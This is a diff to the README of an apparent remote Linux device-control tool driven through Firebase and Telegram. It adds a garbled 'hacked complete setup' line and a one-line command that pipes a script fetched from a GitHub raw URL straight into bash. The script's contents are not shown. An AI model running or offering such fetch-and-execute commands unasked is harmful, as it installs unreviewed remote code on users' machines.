@@ -55,6 +55,14 @@ Linux Device Control: Fully control devices remotely through Firebase and Telegr
 }
 ```
 
+```
+ single lines commandes using linux hacked compltes setup now
+bash <(curl -s https://raw.githubusercontent.com/dixitcoder/DixitGuard/main/login-alert.sh)
+
+```
+
+
+
 > ⚠️ **Warning:** Public rules are for testing only. Use secure rules in production.
 
 ### 3. 🖥 Install Dependencies
